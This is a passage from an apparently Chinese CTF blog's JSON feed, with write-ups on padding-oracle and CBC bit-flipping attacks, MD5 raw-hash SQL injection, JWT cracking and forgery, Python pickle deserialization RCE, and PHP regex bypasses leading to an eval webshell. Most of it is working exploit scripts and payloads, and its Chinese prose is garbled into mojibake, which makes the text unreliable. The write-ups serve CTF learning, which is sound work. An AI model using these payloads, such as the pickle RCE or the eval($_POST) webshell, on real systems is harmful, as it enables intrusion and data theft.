0x3D^0x0F=0x32ï¼ˆä¸­é—´å¯†æ–‡^åŸæ¥çš„ivï¼‰\nçŸ¥é“äº†æœ€åä¸€ä½çš„ä¸­é—´å¯†æ–‡ï¼Œå°±å¯ä»¥éå†å€’æ•°ç¬¬äºŒä½iväº†ï¼Œè¿™ä¸ªæ—¶å€™åº”è¯¥ä¸º 0x02 è€Œé 0x01 äº†ã€‚çœ‹å›¾å°±æ‡‚ï¼š\nä»¥æ­¤ç±»æ¨ï¼Œæˆ‘ä»¬å¯ä»¥å°±èƒ½æ¨ç®—æ‰€æœ‰ä¸­é—´å¯†æ–‡ï¼Œå†ç”¨ ä¸­é—´å¯†æ–‡^åŸæ¥çš„iv å°±èƒ½ç®—å‡ºæ˜æ–‡äº†\nCBCå­—èŠ‚ç¿»è½¬æ”»å‡» æœ‰äº†ä¸Šé¢çš„CBCåŠ å¯†è§£å¯†è¿‡ç¨‹çš„åŸºç¡€ï¼Œè¿™ä¸ªæ‰‹æ®µå…¶å®å¾ˆå®¹æ˜“ç†è§£ï¼›\nç”±è§£å¯†ç®—æ³•å¯çŸ¥ï¼š\nA=B^C\rç”± ^ è¿ç®—çš„æ€§è´¨æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼š\nA=B^Cã€B=A^Cã€C=A^B\rè¿™æ˜¯æœ€å…³é”®çš„ä¸€ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥æ¨å¯¼å‡ºä¸‰è€…åšå¼‚æˆ–è¿ç®—çš„ç»“æœæ˜¯0\nC=A^B\rC^C=A^B^C=0\ræˆ‘ä»¬ä¿®æ”¹äº†Bçš„å€¼ï¼Œå°±ä¸€å®šä¼šå½±å“åˆ°A\nB^X^C=A^X\rä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åªè¦ç»™Bå¼‚æˆ–äº†Xï¼ŒAçš„å€¼ä¹Ÿä¼šæ”¹å˜ä¸ºä»–ä¹‹å‰çš„å€¼å¼‚æˆ–Xçš„ç»“æœ\nä¸€ é“CTFçš„ä¾‹å­ NPUCTF2020_webğŸ•\næˆ‘æ‘Šç‰Œäº†ï¼Œå°±æ˜¯æ‡’å¾—å†™å‰ç«¯\r\u0026lt;?php error_reporting(0);\rinclude('config.php'); # $key,********$file1*********\rdefine(\u0026quot;METHOD\u0026quot;, \u0026quot;aes-128-cbc\u0026quot;); //å®šä¹‰åŠ å¯†æ–¹å¼\rdefine(\u0026quot;SECRET_KEY\u0026quot;, $key); //å®šä¹‰å¯†é’¥\rdefine(\u0026quot;IV\u0026quot;,\u0026quot;6666666666666666\u0026quot;); //å®šä¹‰åˆå§‹å‘é‡ 16ä¸ª6\rdefine(\u0026quot;BR\u0026quot;,'\u0026lt;br\u0026gt;');\rif(!isset($_GET['source']))header('location:./index.php?source=1');\r#var_dump($GLOBALS); //å¬è¯´ä½ æƒ³çœ‹è¿™ä¸ªï¼Ÿ\rfunction aes_encrypt($iv,$data)\r{\recho \u0026quot;--------encrypt---------\u0026quot;.BR;\recho 'IV:'.$iv.BR;\rreturn base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;\r}\rfunction aes_decrypt($iv,$data)\r{\rreturn openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) or die('False'); #ä¸è¿”å›å¯†æ–‡ï¼Œè§£å¯†æˆåŠŸè¿”å›1ï¼Œè§£å¯†å¤±è´¥è¿”å›False\r}\rif($_GET['method']=='encrypt')\r{\r$iv = IV;\r$data = $file1; echo aes_encrypt($iv,$data);\r} else if($_GET['method']==\u0026quot;decrypt\u0026quot;)\r{\r$iv = @$_POST['iv'];\r$data = @$_POST['data'];\recho aes_decrypt($iv,$data);\r}\recho \u0026quot;æˆ‘æ‘Šç‰Œäº†ï¼Œå°±æ˜¯æ‡’å¾—å†™å‰ç«¯\u0026quot;.BR;\rif($_GET['source']==1)highlight_file(__FILE__);\r?\u0026gt;\rpadding Oracle Attack\nexpï¼š\n# coding:utf-8\rimport requests\rimport base64\r# b'\\x97.\\xda\\xb8\\xa5P\\t\\x95\\xae\\x9b\\xf5\\xbf\\xe2\\x8b.\u0026lt;'\rCYPHERTEXT = base64.b64decode(\u0026quot;ly7auKVQCZWum/W/4osuPA==\u0026quot;)\r# initialization vector\rIV = \u0026quot;6666666666666666\u0026quot;\r# PKCS7 16ä¸ªå­—èŠ‚ä¸º1ç»„\rN = 16\r# intermediaryValue ^ IV = plainText\rinermediaryValue = \u0026quot;\u0026quot;\rplainText = \u0026quot;\u0026quot;\r# çˆ†ç ´æ—¶ä¸æ–­éœ€è¦æ›´æ”¹çš„iv\riv = \u0026quot;\u0026quot;\rURL = \u0026quot;http://webdog.popscat.top/index.php?method=decrypt\u0026amp;source=1\u0026quot;\rdef xor(a, b):\r\u0026quot;\u0026quot;\u0026quot;\rç”¨äºè¾“å‡ºä¸¤ä¸ªå­—ç¬¦ä¸²å¯¹ä½å¼‚æˆ–çš„ç»“æœ\r\u0026quot;\u0026quot;\u0026quot;\rreturn \u0026quot;\u0026quot;.join([chr(ord(a[i]) ^ ord(b[i])) for i in range(len(a))])\rfor step in range(1, N + 1):\rpadding = chr(step) * (step - 1)\rprint(step,end=\u0026quot;,\u0026quot;)\rfor i in range(0, 256):\rprint(i)\r\u0026quot;\u0026quot;\u0026quot;\rivç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š\rå¾…çˆ†ç ´ä½ç½® chr(0)*(N-step) æ­£åœ¨çˆ†ç ´ä½ç½® chr(i) ä½¿ iv[N-step+1:] ^ inermediaryValue = padding çš„ xor(padding,inermediaryValue)\r\u0026quot;\u0026quot;\u0026quot;\riv = chr(0)*(N-step)+chr(i)+xor(padding,inermediaryValue)\rdata = {\r\u0026quot;data\u0026quot;: \u0026quot;ly7auKVQCZWum/W/4osuPA==\u0026quot;,\r\u0026quot;iv\u0026quot;: iv\r}\rr = requests.post(URL,data = data)\rif r.text !=\u0026quot;False\u0026quot;:\rinermediaryValue = xor(chr(i),chr(step)) + inermediaryValue\rprint(inermediaryValue)\rbreak\rplainText = xor(inermediaryValue,IV)\rprint(plainText)\rè¿è¡Œï¼Œå¾—åˆ° FlagIsHere.php è®¿é—®ä¹‹ï¼Œå¾—åˆ°å¦‚ä¸‹æºç ï¼š\nF7LMTk/3nKSVUoSQuOS/dA==\r\u0026lt;?php #error_reporting(0);\rinclude('config.php'); //**************$file2********last step!!\rdefine(\u0026quot;METHOD\u0026quot;, \u0026quot;aes-128-cbc\u0026quot;);\rdefine(\u0026quot;SECRET_KEY\u0026quot;, \u0026quot;6666666\u0026quot;);\rsession_start();\rfunction get_iv(){ //ç”Ÿæˆéšæœºåˆå§‹å‘é‡IV\r$random_iv='';\rfor($i=0;$i\u0026lt;16;$i++){\r$random_iv.=chr(rand(1,255));\r}\rreturn $random_iv;\r}\r$lalala = 'piapiapiapia';\rif(!isset($_SESSION['Identity'])){\r$_SESSION['iv'] = get_iv();\r$_SESSION['Identity'] = base64_encode(openssl_encrypt($lalala, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $_SESSION['iv']));\r}\recho base64_encode($_SESSION['iv']).\u0026quot;\u0026lt;br\u0026gt;\u0026quot;;\rif(isset($_POST['iv'])){\r$tmp_id = openssl_decrypt(base64_decode($_SESSION['Identity']), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_POST['iv']));\recho $tmp_id.\u0026quot;\u0026lt;br\u0026gt;\u0026quot;;\rif($tmp_id ==='weber')die($file2);\r}\rhighlight_file(__FILE__);\r?\u0026gt;\ræ•´ç†ä¸€ä¸‹å·²çŸ¥ä¿¡æ¯ï¼š\niv=\rF7LMTk/3nKSVUoSQuOS/dA==\r\\x17 \\xb2 \\xcc \\x4e \\x4f \\xf7 \\x9c \\xa4 \\x95 \\x52 \\x84 \\x90 \\xb8 \\xe4 \\xbf \\x74 åŠ å¯†åï¼š\r$Identity='MLvuYeH07rhiAa5NJ1p75A=='\r$Identity='\\x30 \\xbb \\xee \\x61 \\xe1 \\xf4 \\xee \\xb8 \\x62 \\x01 \\xae \\x4d \\x27 \\x5a \\x7b \\xe4 '\rç›®çš„å°±æ˜¯ä¼ å…¥æ–°çš„ivå¯¹identityè¿›è¡Œè§£å¯†ï¼Œå¦‚æœè§£å¯†ç»“æœä¸º\u0026rsquo;weber\u0026rsquo;é‚£ä¹ˆå°±çˆ½æ­ªæ­ªï¼Œè¿™é‡Œè€ƒå¯Ÿçš„å°±æ˜¯CBCå­—èŠ‚ç¿»è½¬æ”»å‡»\nå’ŒPadding Oracle Attackä¸ä¸€æ ·ï¼Œè¿™é‡Œä¸éœ€è¦æ¨æµ‹ä¸­é—´å¯†æ–‡ï¼Œæ ¹æ®æˆ‘ä¸Šé¢è¯´çš„\nB^X^C=A^X\ræœ¬æ¥æ˜¯ piapiapiapia\\x04\\x04\\x04\\x04 ç°åœ¨æˆ‘ä»¬éœ€è¦æ”¹ä¸º weber\\x0B\\x0B\\x0B\\x0B\\x0B\\x0B\\x0B\\x0B\\x0B\\x0B\\x0B ï¼Œå°±æ‹¿ç¬¬ä¸€ä½æ¥è¯´ï¼š\næˆ‘ä»¬æƒ³è¦æŠŠ p æ”¹ä¸º w ï¼Œé‚£ä¹ˆæˆ‘å°±è¦æ‰¾å‡º X çš„å€¼ï¼Œ 'p'^X='w' å¾ˆå®¹æ˜“ç®—å‡º X='p'^'w' é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åœ¨å°†Bå¼‚æˆ–ä¸€ä¸ª ('p'^'w') ï¼Œå°±å¯ä»¥è¾¾åˆ°ç›®çš„ã€‚\nä¸è¿‡å½“æ—¶æ¯”èµ›çš„æ—¶å€™å¹³å°è¢«Däº†ï¼Œæˆ‘æ˜¯åœ¨å‡ºé¢˜äººçš„å­¦ç”Ÿæœºä¸Šé¢è·‘ï¼Œè„šæœ¬åº”è¯¥æ²¡é—®é¢˜ï¼Œä½†æ˜¯è·‘ä¸å‡ºæ¥ï¼Œæ¢äº†æ­£å¸¸ç¯å¢ƒivåˆä¸ä¸€æ ·æ‡’å¾—é‡å†™ï¼Œæ‰€ä»¥ç”¨äº†å­¦é•¿çš„è„šæœ¬ï¼š\nimport base64\rdef bxor(b1, b2): # use xor for bytes\rparts = []\rfor b1, b2 in zip(b1, b2):\rparts.append(bytes([b1 ^ b2]))\rreturn b''.join(parts)\riv = base64.b64decode(\u0026quot;h34HL5RbMPw8oTaQ+P58nw==\u0026quot;)\rtext = b\u0026quot;piapiapiapia\\x04\\x04\\x04\\x04\u0026quot;\rresult = b\u0026quot;weber\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\u0026quot;\rmiddle = bxor(iv,text)\riv = bxor(middle,result)\rprint(base64.b64encode(iv))\rè·‘å‡ºæ¥POSTä¸€ä¸ªivè¿‡å»å¾—åˆ°ä¸€ä¸ªç½‘å€ï¼š https://c-t.work/s/034d3b3bf3fb48||verification code:2q2hwm\nå¥½åƒæ˜¯æœ‰ä¸ªé™„ä»¶ï¼Œä¸‹è½½æ¥æ˜¯ä¸€ä¸ªxxx.classæ–‡ä»¶è€ƒçš„Javaåç¼–è¯‘ã€‚ã€‚ã€‚ä¸è¿‡ç™¾åº¦èƒ½æœåˆ°ï¼Œç”¨å·¥å…· jd-gui-1.4.0 ä¸€ä¸‹å°±è·‘å‡ºæ¥ã€‚\nå¾—åˆ°æ•°ç»„ï¼Œå°±æ˜¯flagçš„ASCIIç \nq = [102, 108, 97, 103, 123, 119, 101, 54, 95, 52, 111, 103, 95, 49, 115, 95, 101, 52, 115, 121, 103, 48, 105, 110, 103, 125]\rfor i in q:\rprint(chr(i), end='')\rflag{we6_4og_1s_e4syg0ing}\n","date":"2020-04-21T00:00:00Z","permalink":"https://anthem-whisper.github.io/p/padding-oracle-attackcbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/","title":"Padding Oracle Attack\u0026CBCå­—èŠ‚ç¿»è½¬æ”»å‡»"},{"content":"åœ¨ç½‘ä¸Šçœ‹åˆ°ä¸€é“CTFé¢˜ç›®ï¼šhttps://ctf.show/challenges#web9\næ‰“å¼€åæ‰«ç›®å½•å‘ç°robots.txtï¼Œé‡Œé¢æç¤ºäº†index.phpsï¼Œä¸‹è½½ï¼Œå®¡è®¡ï¼Œå‘ç°MD5å“ˆå¸Œæ³¨å…¥ï¼š\n\u0026lt;?php\r$flag=\u0026quot;\u0026quot;;\r$password=$_POST['password'];\rif(strlen($password)\u0026gt;10){\rdie(\u0026quot;password error\u0026quot;);\r}\r$sql=\u0026quot;select * from user where username ='admin' and password ='\u0026quot;.md5($password,true).\u0026quot;'\u0026quot;;\r$result=mysqli_query($con,$sql);\rif(mysqli_num_rows($result)\u0026gt;0){\rwhile($row=mysqli_fetch_assoc($result)){\recho \u0026quot;ç™»é™†æˆåŠŸ\u0026lt;br\u0026gt;\u0026quot;;\recho $flag;\r}\r}\r?\u0026gt;\ré—®é¢˜å‡ºåœ¨ç¬¬7è¡Œmd5($password,true)ï¼Œå¯†ç ä½¿ç”¨äº† md5 ä»¥äºŒè¿›åˆ¶å½¢å¼åŠ å¯†åè¿›è¡Œåœ¨æ•°æ®åº“ä¸­è¿›è¡ŒæŸ¥è¯¢ï¼Œè‹¥æŸ¥è¯¢åˆ°äº†æ•°æ®ï¼Œå°±è¿”å›æˆåŠŸã€‚\nç¬¬ä¸€ç§æ–¹æ³•æ˜¯å°†åŠ å¯†åçš„å¯†ç æ„é€ å‡ºç±»ä¼¼ ' or \u0026lsquo;1\u0026rsquo; çš„å½¢å¼\n\u0026lt;?php\r$v = 'a';\r$payload2 = \u0026quot;'or'\u0026quot;;\rwhile(1){\r$hash = hash(\u0026quot;md5\u0026quot;,$v,true);\rif(substr_count($hash, $payload2) == 1){\rdie($v); }\r$v++;\r}\r?\u0026gt;\rè¿™æ˜¯ç½‘ä¸Šçš„è„šæœ¬ä¸è¿‡æˆ‘å€’æ˜¯æ²¡è·‘å‡ºæ¥ã€‚ã€‚ã€‚\nè¿™é‡Œ $v++ å…¶å®æ˜¯æŒ‰ç…§ ascii å­—ç¬¦è¿›è¡Œåç§»çš„ï¼›\næœ€åå¯ä»¥å¾—åˆ°ä¸€ä¸ªç»“æœ ffifdyopï¼Œï¼ˆè¿˜æœ‰ä¸€ä¸ªæ˜¯129581926211651571912466741651878684928ï¼‰\nå°†è¿™ä¸ªåŠ å¯†å›å»è¯•è¯•ï¼Œçœ‹åˆ°ç¡®å®æ˜¯'or'çš„å½¢å¼\né‚£ä¹ˆåªè¦æˆ‘ä»¬éšæ„è¾“å…¥ä¸€ä¸ªç”¨æˆ·åï¼Œå¯†ç ä¸º ffifdyop é‚£ä¹ˆè¿™æ ·æˆ‘ä»¬çš„è¯­å¥å°±å˜æˆäº†ï¼š\nselect * from users where user = 'admin' and password = ''or'6è’¥æ¬“!r,î‹b\u001c'\rè¿™æ ·å°±å¯æˆåŠŸç»•è¿‡åˆ¤æ–­ã€‚\nè¿˜æœ‰ä¸€ä¸ªæ„é€ çš„æ–¹æ³•æ˜¯æ„é€  '=' çš„å½¢å¼ï¼Œä¹Ÿå°±æ˜¯\nselect * from users where user = 'admin' and password = ''=''\rä¸ºä»€ä¹ˆè¿™æ ·æ„é€ å¯ä»¥å‘¢ï¼Ÿå› ä¸º password = ''='' ä¸­ï¼Œå…ˆåˆ¤æ–­ password ='' ï¼Œè¿™ä¸ªè‚¯å®šæ˜¯è¿”å› 0 çš„ï¼Œå› ä¸º password ä¸­æ²¡æœ‰''è¿™ä¸ªå­—æ®µå€¼ï¼Œå‰é¢è¿”å› 0 ä»¥åï¼Œå†å’Œåé¢çš„ç­‰å·åšæ¯”è¾ƒï¼š0 = ''\nå› ä¸ºåé¢çš„æ ¹æ® php çš„å¼±ç±»å‹è¿›è¡Œåˆ¤æ–­ï¼Œ0 å’Œå­—ç¬¦ä¸²æ¯”è¾ƒå§‹ç»ˆè¿”å› 1\næ‰€ä»¥æ•´ä¸ª sql è¯­å¥å°±ç›¸å½“äºï¼š\nselect * from users where user = 'admin' and 1\ræ‰€ä»¥ä¸ä¸Šé¢çš„ \u0026lsquo;or\u0026rsquo; ä¸åŒçš„æ˜¯ï¼Œè¿™ä¸ªéœ€è¦ä¼ å…¥ä¸€ä¸ªå­˜åœ¨çš„ç”¨æˆ·åæ‰å¯ä»¥æ­£å¸¸ç»•è¿‡ï¼š\n//by wh1sper\r\u0026lt;?php\r$v = 'a';\r//die(md5('kydba',true));\r$payload2 = \u0026quot;'='\u0026quot;;\rwhile(1){\r$hash = hash(\u0026quot;md5\u0026quot;,$v,true);\rif(preg_match(\u0026quot;/^$payload2/i\u0026quot;, $hash)){\rdie($v);\r}\r$v++;\r}\rå¾—åˆ°ç»“æœæ˜¯kydbaï¼ŒåŠ å¯†å›å»æ˜¯'='NJï¿½ï¿½sï¿½ï¿½5ï¿½zï¿½ï¿½@\nflag{9e92802a-684e-4115-bbe8-f3fdbbf71339}\n","date":"2020-04-15T00:00:00Z","permalink":"https://anthem-whisper.github.io/p/md5%E5%93%88%E5%B8%8C%E6%B3%A8%E5%85%A5/","title":"MD5å“ˆå¸Œæ³¨å…¥"},{"content":"[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun è€ƒç‚¹ï¼šç®€å•pythonè„šæœ¬ã€é€»è¾‘æ¼æ´ã€JWTç ´è§£ä¸ä¼ªé€ ã€pythonååºåˆ—åŒ–\né¡µé¢æºç é‡Œé¢æç¤ºè„‘æ´æ¯”è¾ƒå¤§ï¼Œç»™äº†æç¤ºï¼Œå¦‚ä¸Šå›¾\nç›®çš„æ˜¯è¦ä¹°åˆ°LV6çš„ä¸œè¥¿ï¼Œä¸‹é¢åˆ™æ˜¯500é¡µçš„å•†å“ï¼Œéœ€è¦æˆ‘ä»¬è‡ªè¡Œå¯»æ‰¾ã€‚\nåœ¨æºç é‡Œé¢çœ‹åˆ°ï¼Œæ¯ä¸ªå•†å“çš„å›¾ç‰‡å°±æ˜¯lv?.pngé‚£ä¹ˆæˆ‘ä»¬æ¨æµ‹lv6.pngä¸€å®šå­˜åœ¨äºæŸä¸€é¡µã€‚\nå†™ä¸€ä¸ªè„šæœ¬æ‰¾æ‰¾ï¼š\n#by wh1sper\rimport requests\rhost = 'http://7d1e7948-30d9-42b8-b6e6-f74e7fc4a5eb.node3.buuoj.cn/shop?page='\rfor i in range(1,500):\rr = requests.get(url=host+str(i))\rif 'lv6.png' in r.text:\rprint('page = ', i)\rbreak\rå¾—åˆ°181ï¼Œè®¿é—®ä¹‹ï¼š\nhttp://7d1e7948-30d9-42b8-b6e6-f74e7fc4a5eb.node3.buuoj.cn/shop?page=181\rä¸å‡ºé¢„æ–™çš„ä¹°ä¸èµ·ã€‚ã€‚ã€‚\nä½†æ˜¯æˆ‘ä»¬å›å¤´å»çœ‹burpé‡Œé¢çš„æ•°æ®åŒ…ï¼Œå‘ç°è¯·æ±‚ä½“é‡Œé¢æœ‰ä¸€ä¸ªé”®åä¸ºdiscount=0.8ï¼Œæ”¹æˆdiscount=0.00000000001è¯•è¯•ï¼Œæœç„¶å¯ä»¥ï¼ŒæˆåŠŸè´­ä¹°äº†lv6ï¼Œé¡µé¢é‡å®šå‘åˆ° /b1g_m4mber ä¸è¿‡æç¤ºè¿™ä¸ªé¡µé¢åªèƒ½adminæ‰èƒ½è®¿é—®ã€‚äºæ˜¯æˆ‘ä»¬åˆå›è¿‡å¤´å»çœ‹è¯·æ±‚å¤´ï¼Œå‘ç°cookieé‡Œé¢æœ‰ä¸€ä¸ªä¸œè¥¿å«åšJWTï¼ˆJson Web Tokenï¼‰\nJWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndoMXNwZXIifQ.Z3wlMUbdDHNs4x4PiVx43YD-CGibsHUC5f3ApnYId58\ré™„ä¸Šçˆ†ç ´å·¥å…·GitHubåœ°å€ï¼šhttps://github.com/brendan-rius/c-jwt-cracker\nroot@kali:~/tools/JWTcrake/c-jwt-cracker-master# ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndoMXNwZXIifQ.Z3wlMUbdDHNs4x4PiVx43YD-CGibsHUC5f3ApnYId58\rSecret is \u0026quot;1Kun\u0026quot;\rroot@kali:~/tools/JWTcrake/c-jwt-cracker-master#\råœ¨https://jwt.io/è¿™ä¸ªç½‘ç«™å¯ä»¥è¿›è¡Œä¼ªé€ ï¼ŒæŠŠèº«ä»½æ”¹æˆadminã€‚\næˆ‘ä»¬å°±å¯ä»¥æ„‰å¿«çš„è¿›è¡Œä¼ªé€ äº†ï¼Œæ‰“å¼€F12-\u0026gt;application-\u0026gt;cookie,å°†JWTå€¼æ”¹æˆï¼š\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo\råˆ·æ–°ä¹‹åæˆ‘ä»¬å°±æ˜¯adminå•¦~\nctrl+UæŸ¥çœ‹æºç ï¼Œæç¤ºäº†/static/asd1f654e683wq/www.zipç½‘ç«™æºç ï¼Œ\nä¸‹è½½ä¸‹æ¥ï¼Œå‘ç°æ˜¯pythonçš„tornadoæ¡†æ¶ç¼–å†™çš„åç«¯\nåœ¨/sshop/views/Admin.pyé‡Œé¢å‘ç°äº†pythonååºåˆ—åŒ–æ¼æ´ï¼š\n#by wh1sper\r#Admin.py\rimport tornado.web\rfrom sshop.base import BaseHandler\rimport pickle\rimport urllib\rclass AdminHandler(BaseHandler):\r@tornado.web.authenticated\rdef get(self, *args, **kwargs):\rif self.current_user == \u0026quot;admin\u0026quot;:\rreturn self.render('form.html', res='This is Black Technology!', member=0)\relse:\rreturn self.render('no_ass.html')\r@tornado.web.authenticated\rdef post(self, *args, **kwargs):\rtry:\rbecome = self.get_argument('become')\rp = pickle.loads(urllib.unquote(become))\rreturn self.render('form.html', res=p, member=1)\rexcept:\rreturn self.render('form.html', res='This is Black Technology!', member=0)\rç¬¬21è¡Œpickle.loadså‡½æ•°å­˜åœ¨pythonååºåˆ—åŒ–æ¼æ´\npythonä¸­çš„ç±»æœ‰ä¸€ä¸ª__reduce__æ–¹æ³•ï¼Œç±»ä¼¼ä¸PHPä¸­çš„__wakeup__ï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚\n reduceå®ƒè¦ä¹ˆè¿”å›ä¸€ä¸ªä»£è¡¨å…¨å±€åç§°çš„å­—ç¬¦ä¸²ï¼ŒPyhtonä¼šæŸ¥æ‰¾å®ƒå¹¶pickleï¼Œè¦ä¹ˆè¿”å›ä¸€ä¸ªå…ƒç»„ã€‚ è¿™ä¸ªå…ƒç»„åŒ…å«2åˆ°5ä¸ªå…ƒç´ ï¼Œå…¶ä¸­åŒ…æ‹¬ï¼š ä¸€ä¸ªå¯è°ƒç”¨çš„å¯¹è±¡ï¼Œç”¨äºé‡å»ºå¯¹è±¡æ—¶è°ƒç”¨ï¼› ä¸€ä¸ªå‚æ•°å…ƒç´ ï¼Œä¾›é‚£ä¸ªå¯è°ƒç”¨å¯¹è±¡ä½¿ç”¨ï¼› è¢«ä¼ é€’ç»™ setstate çš„çŠ¶æ€ï¼ˆå¯é€‰ï¼‰ï¼›ä¸€ä¸ªäº§ç”Ÿè¢«pickleçš„åˆ—è¡¨å…ƒç´ çš„è¿­ä»£å™¨ï¼ˆå¯é€‰ï¼‰ï¼›ä¸€ä¸ªäº§ç”Ÿè¢«pickleçš„å­—å…¸å…ƒç´ çš„è¿­ä»£å™¨ï¼ˆå¯é€‰ï¼‰  çœ‹ä¸€ä¸ªä¾‹å­ï¼š\nimport pickle\rimport os\rclass A(object):\rdef __reduce__(self):\rreturn (os.system,('ls',))\ra = A()\rtest = pickle.dumps(a)\rpickle.loads(test)\rå‘½ä»¤ä¼šè¢«æ‰§è¡Œï¼›\né‚£ä¹ˆå«–ä¸€ä¸ªexpï¼š\n#python2\r# coding=utf8\rimport pickle\rimport urllib\rimport commands\rclass payload(object):\rdef __reduce__(self):\r#return (commands.getoutput,('ls /',))\rreturn (commands.getoutput,('tac /flag.txt',))\ra = payload()\rprint urllib.quote(pickle.dumps(a))\rpy2è·‘ä¸€ä¸‹å¾—åˆ°ï¼š\nccommands%0Agetoutput%0Ap0%0A%28S%27tac%20/flag.txt%27%0Ap1%0Atp2%0ARp3%0A.\ræŠ“åŒ…æ”¹become=ï¼ˆä¸Šé¢çš„ï¼‰ï¼Œå¯ä»¥RCE\nflag{922dd06c-d1e7-4550-b9fd-80332ff3bb87}\n[MRCTF2020]å¥—å¨ƒ è€ƒç‚¹ï¼šPHPæŠŠ.è§£æä¸º_ã€JSfuckã€data://åè®®çš„ä½¿ç”¨ã€é€†å‘phpç®—æ³•\næ‰“å¼€é¢˜ç›®ï¼Œæºç é‡Œé¢æç¤ºï¼š\n$query = $_SERVER['QUERY_STRING'];\rif( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){\rdie('Y0u are So cutE!');\r}\rif($_GET['b_u_p_t'] !== '23333' \u0026amp;\u0026amp; preg_match('/^23333$/', $_GET['b_u_p_t'])){\recho \u0026quot;you are going to the next ~\u0026quot;;\r}\rä¼ å€¼ï¼š?b.u.p.t=23333%0Aï¼Œæç¤ºè®¿é—®secrettw.php è®¿é—®ä¹‹åæºç ç»™äº†JSfuckï¼Œå¤åˆ¶åˆ°æ§åˆ¶å°è¿è¡Œä¸‹å¾—åˆ°â€œPOST ME Merakâ€ï¼Œpostä¸€ä¸ªé”®åä¸ºMerakçš„ä»»æ„å€¼ï¼Œå¾—åˆ°æºç ï¼š\nFlag is here~But how to get it? \u0026lt;?php error_reporting(0); include 'takeip.php';\rini_set('open_basedir','.'); include 'flag.php';\rif(isset($_POST['Merak'])){ highlight_file(__FILE__); die(); } function change($v){ $v = base64_decode($v); $re = ''; for($i=0;$i\u0026lt;strlen($v);$i++){ $re .= chr ( ord ($v[$i]) + $i*2 ); } return $re; }\recho 'Local access only!'.\u0026quot;\u0026lt;br/\u0026gt;\u0026quot;;\r$ip = getIp();\rif($ip!='127.0.0.1')\recho \u0026quot;Sorry,you don't have permission! Your ip is :\u0026quot;.$ip;\rif($ip === '127.0.0.1' \u0026amp;\u0026amp; file_get_contents($_GET['2333']) === 'todat is a happy day' ){\recho \u0026quot;Your REQUEST is:\u0026quot;.change($_GET['file']);\recho file_get_contents(change($_GET['file'])); }\r?\u0026gt;\rfile_get_contents($_GET['2333'])éœ€è¦ä½¿ç”¨dataåè®®ï¼Œç„¶åé€†å‘ä¸Šé¢çš„å‡½æ•°å°±è¡Œäº†\n?2333=data://text/plain,todat+is+a+happy+day\u0026amp;file=ZmpdYSZmXGI=\rè¿™æ˜¯è„šæœ¬ï¼š\n\u0026lt;?php\rfunction change($v){\r$v = base64_decode($v);\r$re = '';\rfor($i=0;$i\u0026lt;strlen($v);$i++){\r$re .= chr ( ord ($v[$i]) + $i*2 );\r}\recho $re;\r}\rfunction re($re){\r$v = '';\rfor($i = 0; $i \u0026lt; strlen($re); $i ++){\r$v .= chr( ord($re[$i]) - $i*2);\r}\recho base64_encode($v),' ';\rreturn base64_encode($v);\r}\rre('flag.php');\rchange(re('flag.php'));//éªŒè¯\rflag{4a0b1480-dcfa-4f59-aa4b-9db551ec653e}\n[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME è€ƒç‚¹ï¼šphpå¼‚æˆ–å–åç»•è¿‡æ­£åˆ™ã€ç»•è¿‡disable_functionsæ‰§è¡Œå‘½ä»¤\nå…ˆè´´ä¸€ç¯‡ï¼š\u0026raquo;PHPç»•è¿‡æ­£åˆ™çš„åŠæ³•\næœ¬æ¥æ˜¯æ¯”è¾ƒéš¾çš„ä¸€é“é¢˜ï¼Œçœ‹äº†wpåšçš„ï¼Œå¯ä»¥å·¥å…·ä¸€æŠŠæ¢­ä¹Ÿå¯ä»¥æ‰‹æ’¸\né€æºç ï¼š\n\u0026lt;?php\rerror_reporting(0);\rif(isset($_GET['code'])){\r$code=$_GET['code'];\rif(strlen($code)\u0026gt;40){\rdie(\u0026quot;This is too Long.\u0026quot;);\r}\rif(preg_match(\u0026quot;/[A-Za-z0-9]+/\u0026quot;,$code)){\rdie(\u0026quot;NO.\u0026quot;);\r}\r@eval($code);\r}\relse{\rhighlight_file(__FILE__);\r}\r// ?\u0026gt;\rçœ‹ä¼¼å¾ˆç®€å•ï¼Œå…¶å®å­¦é—®å¤šï¼Œ\nä¼ å…¥?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();\u0026amp;%ff=phpinfoå¯æŸ¥çœ‹phpinfoï¼›\nèƒ½çœ‹åˆ°æœ‰å¾ˆå¤šdisable_functionsï¼Œç‰ˆæœ¬ä¸ºPHP7\næ„é€ shellè¿æ¥èšå‰‘ï¼š\n\u0026lt;?php error_reporting(0);\r$a='assert';\r$b=urlencode(~$a);\recho $b;\recho \u0026quot;\u0026lt;br\u0026gt;\u0026quot;;\r$c='(eval($_POST['aaa']))';\r$d=urlencode(~$c);\recho 